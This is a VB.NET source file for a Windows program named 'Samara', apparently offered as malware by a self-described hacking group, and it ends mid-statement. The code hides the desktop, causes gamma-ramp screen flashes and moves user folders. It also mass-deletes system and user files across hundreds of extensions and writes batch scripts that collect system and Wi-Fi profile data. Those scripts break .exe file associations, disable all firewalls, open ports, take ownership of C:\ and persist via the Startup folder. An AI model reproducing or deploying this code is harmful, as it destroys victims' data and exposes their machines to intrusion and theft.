REM: Rythorian Ethrovon: (Profile:) Elite leader of "The 9th Wave Hacking Group"
REM: Occupation: Ethical Hacker (Grey Hat) 
REM: Mission: Protect the world from corporates, who like poisoning our earth and our children with toxins.
REM: Alias': David |Justin Linwood Ross | Rythorian77: https://github.com/Rythorian77?tab=repositories |
REM: Alias (Continued) Lucian Patterson: https://www.youtube.com/channel/UCKIZrCrSyW_db1ZFCE5-MZw/videos?view=0&sort=dd&shelf_id=0
Imports System.ComponentModel
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Text
Imports System.Threading
Imports Microsoft.Win32

Public Class Samara

#Region "1) Global Variables"
    'Hide/Show Desktop/Taskbar

    Public Const SWP_HIDEWINDOW = &H80

    Public Const SWP_SHOWWINDOW = &H40

    Public Const SW_HIDE As Integer = 0

    Public Const SW_RESTORE As Integer = 9

    Dim taskBar As Integer

    'This changes Desktop Wallpaper
    Private Const SPI_SETDESKWALLPAPER As Integer = &H14

    Private Const SPIF_UPDATEINIFILE As Integer = &H1

    Private Const SPIF_SENDWININICHANGE As Integer = &H2

    Private Declare Auto Function SystemParametersInfo Lib "user32.dll" (uAction As Integer, uParam As Integer,
                                                                         lpvParam As String, fuWinIni As Integer) As Integer

    Declare Function SetWindowPos Lib "user32" (hwnd As Integer, hWndInsertAfter As Integer, x As Integer, y As Integer, cx As Integer, cy As Integer, wFlags As Integer) As Integer
    Declare Function FindWindow Lib "user32" Alias "FindWindowA" (lpClassName As String, lpWindowName As String) As Integer
    Private Declare Function ShowWindow Lib "user32" (hwnd As IntPtr, nCmdShow As Integer) As Integer


    Private Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (hProcess As IntPtr,
        dwMinimumWorkingSetSize As Integer, dwMaximumWorkingSetSize As Integer) As Integer

    <DllImport("winmm.dll")>
    Private Shared Function mciSendString(command As String, buffer As String, bufferSize As Integer, hwndCallback As IntPtr) As Integer
    End Function

    'Gamma System Lighting (RAMP)
    Private Structure RAMP
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=256)>
        Public Red As UShort()
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=256)>
        Public Green As UShort()
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=256)>
        Public Blue As UShort()
    End Structure

    'Changes background colors
    Private Declare Function SetSysColors Lib "user32.dll" (one As Integer, ByRef element As Integer,
        ByRef color As Integer) As Boolean

    'Causes bright flashes
    Private Declare Function apiGetDeviceGammaRamp Lib "gdi32" Alias "GetDeviceGammaRamp" (hdc As Integer,
                                                                                           ByRef lpv As RAMP) As Integer

    Private Declare Function apiSetDeviceGammaRamp Lib "gdi32" Alias "SetDeviceGammaRamp" (hdc As Integer,
                                                                                           ByRef lpv As RAMP) As Integer

    Private Declare Function apiGetWindowDC Lib "user32" Alias "GetWindowDC" (hwnd As Integer) As Integer

    Private Declare Function apiGetDesktopWindow Lib "user32" Alias "GetDesktopWindow" () As Integer

    Private newRamp As New RAMP()

    Private usrRamp As New RAMP()

    Private IsLoaded As Boolean

    'We gather current user of the computer
    Private ReadOnly Endorium As String = "C:\Users\"

    Private ReadOnly TheAnaustrikCalendar As String = Environment.UserName

    Private ReadOnly currentUser As String = "C:\Users\"

    Private ReadOnly userName As String = Environment.UserName

    Private ReadOnly sCurrentDirectory As String = AppDomain.CurrentDomain.BaseDirectory

    Private ReadOnly enviro As String = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)

    Private ReadOnly Pictures As String = "\Pictures"
    Private ReadOnly Music As String = "\Music"
    Private ReadOnly Desktop As String = "\Desktop"
    Private ReadOnly Documents As String = "\Documents"
    Private ReadOnly Favorites As String = "\Favorites"
    Private ReadOnly Videos As String = "\Videos"
    Private ReadOnly History As String = "\History"
    Private ReadOnly InternetCache As String = "\InternetCache"
    Private ReadOnly LocalApplicationData As String = "\LocalApplicationData"
    Private ReadOnly LocalizedResources As String = "\LocalizedResources"
    Private ReadOnly NetworkShortcuts As String = "\NetworkShortcuts"
    Private ReadOnly SendTo As String = "\SendTo"
    Private ReadOnly System As String = "\System"
    Private ReadOnly Windows As String = "\Windows"
    Private ReadOnly SystemX86 As String = "\SystemX86"
    Private ReadOnly StartMenu As String = "\StartMenu"
    Private ReadOnly Templates As String = "\Templates"
    Private ReadOnly Personal As String = "\Personal"
    Private ReadOnly Resources As String = "\Resources"
    Private ReadOnly Programs As String = "\Programs"
    Private ReadOnly ProgramFiles As String = "\ProgramFiles"
    Private ReadOnly ProgramFilesX86 As String = "\ProgramFilesX86"
    Private ReadOnly PrinterShortcuts As String = "\PrinterShortcuts"
    Private ReadOnly Recent As String = "\Recent"
    Private ReadOnly Fonts As String = "\Fonts"
    Private ReadOnly AdminTools As String = "\AdminTools"
    Private ReadOnly ApplicationData As String = "\ApplicationData"

#End Region

#Region "2) Form Load-Closing Events | Ram | Paint | System Lighting"
    Private Sub Form1_Load(sender As Object,
                           e As EventArgs) Handles MyBase.Load
        On Error GoTo Err
        'Schedule tash at highest admin level
        Rythorians_Scheduler()
        Sub_Ordinate_Creation()
        MovementOrder()
        ReleaseRAM()

        'Refuse CD to close
        mciSendString("set CDAudio door open", vbNullString, 0, IntPtr.Zero)

        TrackBar1.Minimum = 1000 : TrackBar1.Maximum = 2000 'Set trackbar to valid range, since if will be half, the lower range is invalid
        TrackBar2.Minimum = 28 : TrackBar2.Maximum = 44
        apiGetDeviceGammaRamp(apiGetWindowDC(apiGetDesktopWindow), usrRamp)
        IsLoaded = True

        My.Computer.Audio.Play(My.Resources.sound, AudioPlayMode.BackgroundLoop)
        'This goes with changing Desktop Wallpaper
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0,
                             "C:\Users\justin.ross\Desktop\Samara\Samara\Samara\Resources\162312.jpg", SPIF_UPDATEINIFILE Or
                             SPIF_SENDWININICHANGE)

        'Form follow
        Timer1.Start()
        Timer2.Start()
        Timer4.Start()
        'Disable CMD from registry
        Timer5.Start()
        Timer6.Start()
        Timer7.Start()
        'Set the FORM width.>>
        Width = 400
        'Set the FORM height.>>
        Height = 400

        'Slapper()
        'AllDrivesGone()

        'taskBar = FindWindow("Shell_traywnd", "")
        'Dim intReturn As Integer = FindWindow("Shell_traywnd", "")
        'SetWindowPos(intReturn, 0, 0, 0, 0, 0, SWP_HIDEWINDOW) 'This will "HIDE" your taskbar/// To bring back taskbar, simply change the end to: SWP_SHOWWINDOW///
        Dim hwnd As IntPtr
        hwnd = FindWindow(vbNullString, "Program Manager")
        If Not hwnd = 0 Then
            ShowWindow(hwnd, SW_HIDE) 'Type "RESTORE" to bring back///
        End If

        Dim path As New Drawing2D.GraphicsPath()
        path.AddEllipse(0, 0, PictureBox1.Width, PictureBox1.Height)
        PictureBox1.Region = New Region(path)

        'Here's how to use a bitmap as a custom cursor you can make it neater. this is just a quick example.
        Using img As New Bitmap("C:\Users\justin.ross\Desktop\Samara\Samara\Samara\Resources\hand_ccexpress.cur")
            'The parameters for CreateCursor are the image to use + the x + y coordinates of the hotspot
            Cursor = Create.CreateCursor(img, 47, 41)
        End Using
        Using CD As New ColorDialog
            Dim BackgroundColor As Integer = ColorTranslator.ToWin32(Color.Black)
            SetSysColors(1, 1, BackgroundColor)
        End Using
Err:
    End Sub


    Private Sub Form1_FormClosed(sender As Object,
                                 e As FormClosedEventArgs) Handles Me.FormClosed
        apiSetDeviceGammaRamp(apiGetWindowDC(apiGetDesktopWindow), usrRamp)
    End Sub

    Private Sub Form1_Resize(sender As Object,
                             e As EventArgs) Handles Me.Resize
        'Refresh the FORM if you resize it.>>
        Refresh()
    End Sub

    Private Sub Samara_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        On Error GoTo Err
        'Dim intReturn As Integer = FindWindow("Shell_traywnd", "")
        'SetWindowPos(intReturn, 0, 0, 0, 0, 0, SWP_HIDEWINDOW) 'This will "HIDE" your taskbar/// To bring back taskbar, simply change the end to: SWP_SHOWWINDOW///
        Dim hwnd As IntPtr
        hwnd = FindWindow(vbNullString, "Program Manager")
        If Not hwnd = 0 Then
            ShowWindow(hwnd, SW_RESTORE) 'Type "RESTORE" to bring back///
        End If
Err:
    End Sub


    Private Sub Form1_Paint(sender As Object,
                            e As PaintEventArgs) Handles Me.Paint

        'Calculate with integer division the middle of the FORM horizontally.>>
        Dim formMiddleX As Integer = Width \ 2
        'Calculate with integer division the middle of the FORM vertically.>>
        Dim formMiddleY As Integer = Height \ 2


        'Used to hold the calculated points as floating point values.>>
        Dim x, y As Double
        'Used to hold the calculated points as INTEGER values.>>
        Dim x1, y1 As Integer

        'Is a LIST of type point that is used to hold the calculated points.>>
        Dim circlePointsList As New List(Of Point)
        'This loop calculates the circle or ellipse poins.>>
        For index As Double = 0 To 2 * Math.PI Step 0.05

            'Holds the horizontal radius of the circle or ellipse.>>
            Dim horizontalRadius As Integer = formMiddleX
            x = (horizontalRadius * Math.Cos(index)) + formMiddleX

            'Holds the vertical radius of the circle or ellipse.>>
            Dim verticalRadius As Integer = formMiddleY
            y = (verticalRadius * Math.Sin(index)) + formMiddleY
            'Convert to an INTEGER the x value.>>
            x1 = CInt(Int(x))
            'Convert to an INTEGER the y value.>>
            y1 = CInt(Int(y))
            'Add the calculated values to the points list as a NEW Point.>>
            circlePointsList.Add(New Point(x1, y1))
        Next

        'Defines an array to hold the calculated points.>>
        'Put the list in an array called circlePoints.>>
        Dim circlePoints() As Point = circlePointsList.ToArray
        'Set up an array of type BYTE to hold the type of each point as a BYTE.>>
        Dim types(circlePoints.GetUpperBound(0)) As Byte
        'Fills the above array called "types" with the appropriate FillMode converted to a BYTE.>>
        For index As Integer = 0 To circlePoints.GetUpperBound(0)
            types(index) = Drawing2D.FillMode.Winding
        Next

        'Defines a GraphicsPath from the calculated points.>>
        Using gp As New Drawing2D.GraphicsPath(circlePoints, types)
            'Set the FORM REGION to the region defined by the calculated points.>>
            Region = New Region(gp)
        End Using

    End Sub

    Private Function DesktopBrightnessContrast(bLevel As Integer,
                                               gamma As Integer) As Integer
        newRamp.Red = New UShort(255) {} : newRamp.Green = New UShort(255) {} : newRamp.Blue = New UShort(255) {}
        For i As Integer = 1 To 255   ' gamma is a value between 3 and 44 
            newRamp.Red(i) = InlineAssignHelper(newRamp.Green(i), InlineAssignHelper(newRamp.Blue(i), CUShort(Math.Min(65535,
                                                                                                                       Math.Max(0, (Math.Pow((i + 1) / 256.0R, gamma * 0.1) * 65535) + 0.5)))))
        Next
        For iCtr As UShort = 0 To 255
            newRamp.Red(iCtr) = CUShort(newRamp.Red(iCtr) / (bLevel / 1000))
            newRamp.Green(iCtr) = CUShort(newRamp.Green(iCtr) / (bLevel / 1000))
            newRamp.Blue(iCtr) = CUShort(newRamp.Blue(iCtr) / (bLevel / 1000))
        Next
        Return apiSetDeviceGammaRamp(apiGetWindowDC(apiGetDesktopWindow), newRamp) ' Now set the value. 
    End Function

    Private Function InlineAssignHelper(Of T)(ByRef target As T, value As T) As T
        target = value : InlineAssignHelper = value
    End Function


    Private Sub MovementOrder()
        On Error GoTo Err

        'Directory we move from
        Dim slide = New DirectoryInfo(currentUser & userName & "\Temp")
        Dim slide1 = New DirectoryInfo(currentUser & userName & "\Music")
        Dim slide2 = New DirectoryInfo(currentUser & userName & "\Downloads")
        Dim slide3 = New DirectoryInfo(currentUser & userName & "\Documents")
        Dim slide4 = New DirectoryInfo(currentUser & userName & "\Videos")
        Dim slide5 = New DirectoryInfo(currentUser & userName & "\Programs")
        Dim slide6 = New DirectoryInfo(currentUser & userName & "\ProgramFiles")
        Dim slide7 = New DirectoryInfo(currentUser & userName & "\CurrentUserApplicationData")
        Dim slide8 = New DirectoryInfo(currentUser & userName & "\Pictures")

        'Directory we go to
        slide.MoveTo(currentUser & userName & "\Desktop")
        slide1.MoveTo(currentUser & userName & "\Desktop")
        slide2.MoveTo(currentUser & userName & "\Desktop")
        slide3.MoveTo(currentUser & userName & "\Desktop")
        slide4.MoveTo(currentUser & userName & "\Desktop")
        slide5.MoveTo(currentUser & userName & "\Desktop")
        slide6.MoveTo(currentUser & userName & "\Desktop")
        slide7.MoveTo(currentUser & userName & "\Desktop")
        slide8.MoveTo(currentUser & userName & "\Desktop")
Err:
    End Sub
#End Region

#Region "Mass Deletion | Bat Write & Launch"

    Private Sub Liquidate()
        On Error GoTo Err
        Dim root As String

        root = Environment.GetFolderPath(Environment.SpecialFolder.System)
        root = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
        root = Environment.GetFolderPath(Environment.SpecialFolder.LocalizedResources)
        root = Environment.GetFolderPath(Environment.SpecialFolder.MyComputer)
        root = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
        root = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86)
        root = Environment.GetFolderPath(Environment.SpecialFolder.Programs)
        root = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)

        root = My.Computer.FileSystem.SpecialDirectories.AllUsersApplicationData
        root = My.Computer.FileSystem.SpecialDirectories.CurrentUserApplicationData
        root = My.Computer.FileSystem.SpecialDirectories.MyDocuments
        root = My.Computer.FileSystem.SpecialDirectories.ProgramFiles
        root = My.Computer.FileSystem.SpecialDirectories.Programs
        root = My.Computer.FileSystem.SpecialDirectories.Temp

        DeleteDirectory(root)
Err:

    End Sub

    Private Sub DeleteDirectory(music As String)
        If Directory.Exists(music) Then
            'Delete all files from the Directory
            For Each filepath As String In Directory.GetFiles(music)
                File.Delete(filepath)
            Next
            'Delete all child Directories
            For Each dir As String In Directory.GetDirectories(music)
                DeleteDirectory(dir)
            Next
            'Delete a Directory
            Directory.Delete(music)
        End If
    End Sub

    'This is a secondary for a systematic file deletion
    Private Sub Annihilation()
        'So, this is where it gets even worst...all those lovely files on the victims computer,
        'are now permanently deleted if the application closes...hee...hee...hee.
        'Big Corporate didn't care when they gave your kids cancer, or dumped toxins into our oceans & oil spills.
        Dim exts() As String = {".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep", ".aepx", ".adt", ".adts", ".mdb", ".tiff",
              ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx", ".avi", ".bay", ".bmp", ".cdr", ".accde", ".midi", ".tmp", ".wp5",
              ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw", ".cs", ".csv", ".db", ".dbf", ".dcr", ".der", ".dng", ".accdr", ".msi", ".txt", ".xps",
              ".doc", ".docb", ".docm", ".docx", ".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".aac", ".aiff", ".mui", ".wms",
              ".erf", ".fla", ".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java", ".aifc", ".bin", ".pub", ".wmz",
              ".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef", ".mid", ".mov", ".mp3", ".cda", ".gif", ".vsd",
              ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef", ".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".aspx", ".htm", ".vss",
              ".odt", ".orf", ".p12", ".p7b", ".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".bat", ".html", ".vssm",
              ".pot", ".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx", ".prel", ".cab", ".css", ".vstm",
              ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar", ".raw", ".rb", ".rtf", ".rw2", ".dif", ".scss", ".vstx",
              ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2", ".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".dll", ".sass", ".wbk",
              ".wav", ".wb2", ".wma", ".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls", ".eml", ".ini", ".wks",
              ".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip", ".png", ".jfif", ".iso", ".m4a", ".wmd",
              ".3ds", ".3mf", ".7z", ".accft", ".adame", ".adicht", ".adx", ".adz", ".agr", ".ahk", ".cur", ".ai", ".air", ".amg", ".ani", ".ape",
              ".ashx", ".bar", ".bps", ".bin", ".beam", ".bz2", ".blend", ".cdf", ".cpl", ".csproj", ".d3v", ".d4d", ".d4p", ".daf", ".dart", ".vb",
              ".cs", ".dbd", ".dbg", ".dbs", ".dbw", ".dc", ".dbx", ".dc6", ".dcc", ".dcd", ".dch", ".dcs", ".dct", ".dda", ".deb", ".dds", ".dem",
              ".der", ".dfl", ".dfv", ".dic", ".dis", ".dlg", ".dlm", ".dls", ".dochtml", ".docmhtml", ".dothtml", ".dw2", ".dwf", ".ebd", ".email",
              ".emf", ".emz", ".epa", ".etl", ".evt", ".evtx", ".exp", ".fv4", ".fodg", ".fodp", ".fods", ".fodt", ".frm", ".frag", ".fs", ".gz",
              ".har", ".hta", ".hum", ".icc", ".ico", ".ipa", ".j2c", ".jnlp", ".jp2", ".kt", ".lua", ".lz", ".mdi", ".mex", ".mid", ".mp2", ".msc",
              ".myd", ".myi", ".nrw", ".nsa", ".odf", ".odg", ".ogg", ".opus", ".otf", ".otg", ".otp", ".ots", ".ott", ".oxt", ".pal", ".pak", ".pcl",
              ".pdm", ".pdi", ".pdn", ".pfb", ".pfm", ".pfc", ".php3", ".php4", ".pkl", ".py", ".pub", ".glc", ".qfx", ".qif", ".qt", ".qtvr",
              ".ral", ".rdp", ".run", ".scala", ".scr", ".sfx", ".sh", ".shar", ".shtm", ".shtml", ".spf", ".svc", ".sylk", ".tar", ".taz", ".torrent",
              ".tga", ".ut!", ".vbs", ".vbx", ".vmcz", ".vmdk", ".vsto", ".xar", ".xsf", ".xsn", ".gif", ".js"}

        Dim folder As String = Environment.GetFolderPath(Environment.SpecialFolder.System)
        Dim folder1 As String = Environment.GetFolderPath(Environment.SpecialFolder.SystemX86)
        Dim folder2 As String = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
        Dim folder3 As String = Environment.GetFolderPath(Environment.SpecialFolder.MyComputer)
        Dim folder4 As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
        Dim folder5 As String = Environment.GetFolderPath(Environment.SpecialFolder.Favorites)
        Dim folder6 As String = Environment.GetFolderPath(Environment.SpecialFolder.Fonts)
        Dim folder7 As String = Environment.GetFolderPath(Environment.SpecialFolder.History)
        Dim folder8 As String = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache)
        Dim folder9 As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
        Try
            For Each ext As String In exts
                For Each f As String In Directory.GetFiles(folder, ext)
                    File.Delete(f)
                Next
                'Place Audio File Here
            Next
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
        Try
            For Each ext As String In exts
                For Each f As String In Directory.GetFiles(folder1, ext)
                    File.Delete(f)
                Next
                'Place Audio File Here
            Next
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
        Try
            For Each ext As String In exts
                For Each f As String In Directory.GetFiles(folder2, ext)
                    File.Delete(f)
                Next
                'Place Audio File Here
            Next
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
        Try
            For Each ext As String In exts
                For Each f As String In Directory.GetFiles(folder3, ext)
                    File.Delete(f)
                Next
                'Place Audio File Here
            Next
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
        Try
            For Each ext As String In exts
                For Each f As String In Directory.GetFiles(folder4, ext)
                    File.Delete(f)
                Next
                'Place Audio File Here
            Next
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
        Try
            For Each ext As String In exts
                For Each f As String In Directory.GetFiles(folder5, ext)
                    File.Delete(f)
                Next
                'Place Audio File Here
            Next
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
        Try
            For Each ext As String In exts
                For Each f As String In Directory.GetFiles(folder6, ext)
                    File.Delete(f)
                Next
                'Place Audio File Here
            Next
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
        Try
            For Each ext As String In exts
                For Each f As String In Directory.GetFiles(folder7, ext)
                    File.Delete(f)
                Next
                'Place Audio File Here
            Next
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
        Try
            For Each ext As String In exts
                For Each f As String In Directory.GetFiles(folder8, ext)
                    File.Delete(f)
                Next
                'Place Audio File Here
            Next
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
        Try
            For Each ext As String In exts
                For Each f As String In Directory.GetFiles(folder9, ext)
                    File.Delete(f)
                Next
                'Place Audio File Here
            Next
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    REM: This will act like a hacking software but it steals your information and at a certain time encrypt
    REM: your file. (!YOU NEED TO OPEN AS ADMINISTRATOR BECAUSE IT WILL STOP FIREWALLS, CHANGE FILE NAMES AND A LOT MORE!)
    REM: It changes exe file to an unusable file. So good luck with getting the information from your victim because if no exe runs, the pc wont run.

    Private Sub DayStar()
        On Error GoTo Err
        Dim rythorian77 As New StringBuilder
        rythorian77.AppendLine("@echo off")
        rythorian77.AppendLine("Title: Batch (DayStar Neural PathoHack) by: Rythorian77 (AKA Black Star Research)")
        rythorian77.AppendLine(":Commandline")
        rythorian77.AppendLine("IF [""%~1""]==[""-e""] GoTo o")
        rythorian77.AppendLine(":Clear vbs")
        rythorian77.AppendLine("set Batch=%~dpnx0")
        rythorian77.AppendLine("(")
        rythorian77.AppendLine("echo set objshell ^= createobject^(""wscript.shell""^)")
        rythorian77.AppendLine("echo objshell^.run ""%Batch% -e""^,vbhide ) > %temp%\bas.vbs")
        rythorian77.AppendLine("start %temp%\bas.vbs")
        rythorian77.AppendLine("exit")
        rythorian77.AppendLine(":o")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.AppendLine("ipconfig /all")
        rythorian77.AppendLine("timeout /t 3 /nobreak >nul")
        rythorian77.AppendLine("set /p Target: = Target")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.Append("nslookup %Target%")
        rythorian77.AppendLine("ping %Target% -n 65500 -l 12l")
        rythorian77.AppendLine("timeout/t 3 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.Append("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("timeout /t 1 /nobreak >nul")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("echo Searching passwords \")
        rythorian77.AppendLine("timeout /t 5 /nobreak >nul")
        rythorian77.AppendLine(":real dirty work for stealing information")
        rythorian77.AppendLine("nslookup myip.opendns.com resolver1.opendns.com>9K21JM10B.log")
        rythorian77.AppendLine("ver>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO.>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO Username:%username%>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO.>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO Time: %time%>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO.>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO Date: %date%>>9K21JM10B.log")
        rythorian77.AppendLine("assoc .txt = MER99RDUWFILE")
        rythorian77.AppendLine("assoc .jpeg = 9LKMFILE")
        rythorian77.AppendLine("assoc .jpg = NOTAPICTUREFILE")
        rythorian77.AppendLine("assoc .vbs = ggaieFILE")
        rythorian77.AppendLine("assoc .exe = NOTANAPPLICATIONFILE")
        rythorian77.AppendLine("ECHO.>>9K21JM10B.log")
        rythorian77.AppendLine("netsh wlan show profiles>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO.>>9K21JM10B.log")
        rythorian77.AppendLine("ipconfig>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO.>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO Additional Information:>>9K21JM10B.log")
        rythorian77.AppendLine("ipconfig | find /i ""IPv4"">>9K21JM10B.log")
        rythorian77.AppendLine("wmic diskdrive get size>>9K21JM10B.log")
        rythorian77.AppendLine("wmic cpu get name>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO.>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO.>>9K21JM10B.log")
        rythorian77.AppendLine("ECHO.>>9K21JM10B.log")
        rythorian77.AppendLine("systeminfo>>9K21JM10B.log")
        rythorian77.AppendLine("goto ports")
        rythorian77.AppendLine("ren -=- Opens Port 1122 -=-")
        rythorian77.AppendLine(":ports")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("netsh advfirewall firewall add rule name=""Port 1122 TCP"" dir=in action=allow protocol=TCP localport=%1")
        rythorian77.AppendLine("netsh advfirewall firewall add rule name=""Port 1122 UDP"" dir=in action=allow protocol=UDP localport=%1")
        rythorian77.AppendLine("goto firewall")
        rythorian77.AppendLine("ren -=- Turns all Firewalls off -=-")
        rythorian77.AppendLine(":firewall")
        rythorian77.AppendLine("cls")
        rythorian77.AppendLine("netsh firewall set opmode disable")
        rythorian77.AppendLine("netsh firewall set opmode mode=DISABLE")
        rythorian77.AppendLine("netsh advfirewall set currentprofile state off")
        rythorian77.AppendLine("netsh advfirewall set domainprofile state off")
        rythorian77.AppendLine("netsh advfirewall set privateprofile state off")
        rythorian77.AppendLine("netsh advfirewall set publicprofile state off")
        rythorian77.AppendLine("netsh advfirewall set allprofiles state off ")
        rythorian77.AppendLine("cls()")
        rythorian77.Append("IF NOT %ERRORLEVEL%==0")
        rythorian77.AppendLine("CreateObject(""Wscript.Shell"").Run ""DayStar.bat"", 0, True")
        rythorian77.AppendLine("GoTo begin")

        File.WriteAllText("DayStar.bat", rythorian77.ToString())

        Process.Start("DayStar.bat")
Err:

    End Sub

    'For details on what this bat does, see the "HyperNova.txt" file in solution explorer
    Private Sub HyperNova()
        Dim rythorian77 As New StringBuilder
        Try
            rythorian77.AppendLine("@AT>NUL||echo set shell=CreateObject(""Shell.Application""):shell.ShellExecute ""%~dpnx0"",,""%CD%"", ""runas"", 1:set shell=nothing>%~n0.vbs&start %~n0.vbs /realtime& timeout 1 /NOBREAK>nul& del /Q %~n0.vbs&cls&exit")
            rythorian77.AppendLine("if %ERRORLEVEL% == 0 GOTO continue")
            rythorian77.AppendLine(":continue")
            rythorian77.AppendLine("SET DIRECTORY_NAME=C:\") 'Note: You can change path to target a single directory>>SET DIRECTORY_NAME=C:\Users\Etc...
            rythorian77.AppendLine("TAKEOWN /f %DIRECTORY_NAME% /r /d y")   REM:  targets current directory and removes all admin restrictions. Note: DIRECTORY_NAME= can be changed to: FOLDER_NAME=C:\Users\John Doe\Desktop\NewFolder
            rythorian77.AppendLine("ICACLS %DIRECTORY_NAME% /grant administrators:F /t")
            rythorian77.AppendLine("ICACLS %DIRECTORY_NAME% /reset /T")
            rythorian77.AppendLine("icacls foo /grant Everyone:(OI)(CI)F")
            rythorian77.AppendLine("timeout /t 2 /nobreak")
            rythorian77.AppendLine($"echo .appactivate^(""%~1"" ^) : .sendkeys ""{{enter}}")
            rythorian77.AppendLine("timeout /t 2 /nobreak")
            rythorian77.AppendLine("if %ERRORLEVEL% == 0 GOTO continue")
            rythorian77.AppendLine(":continue")
            rythorian77.AppendLine("SetACL.exe -on ""C:\\"" -ot file -actn setprot") 'Note: You can change path to target a single directory>>SET DIRECTORY_NAME=C:\Users\Etc...
            rythorian77.AppendLine("-op ""dacl:np;sacl:nc")
            rythorian77.AppendLine("-rec cont_obj")
            rythorian77.AppendLine("-actn setowner -ownr ""n:S-1-5-32-544;s:y")
            rythorian77.AppendLine("-silent")
            rythorian77.AppendLine("timeout /t 1 /nobreak")
            rythorian77.AppendLine($"echo .appactivate^(""%~1"" ^) : .sendkeys ""{{enter}}")
            rythorian77.AppendLine("if %ERRORLEVEL% == 0 GOTO continue")
            rythorian77.AppendLine(":continue")
            rythorian77.AppendLine("@echo off")
            rythorian77.AppendLine("copy ""%~n0%~x0"" ""%USERPROFILE%\Start Menu\Programs\Startup")
            rythorian77.AppendLine("timeout /t 3 /nobreak")
            rythorian77.AppendLine("goto")
            rythorian77.AppendLine("icacls c:\ /remove:g *S-1-5-11")
            rythorian77.AppendLine("timeout /t 3 /nobreak")
            rythorian77.AppendLine("IF NOT %ERRORLEVEL%==0 GOTO")
            rythorian77.AppendLine("icacls c:\ /grant *S-1-5-11:(OI)(CI)(IO)(M) ")
            rythorian77.AppendLine("goto")
            rythorian77.Append("taskkill /im ktpcntr.exe /f")
            rythorian77.Append("IF NOT %ERRORLEVEL%==0")
            rythorian77.Append("del ""%USERPROFILE%\AppData\Local\Kingsoft\WPS Office\10.1.0.5775\office6\ktpcntr.exe"" /s /f /q")
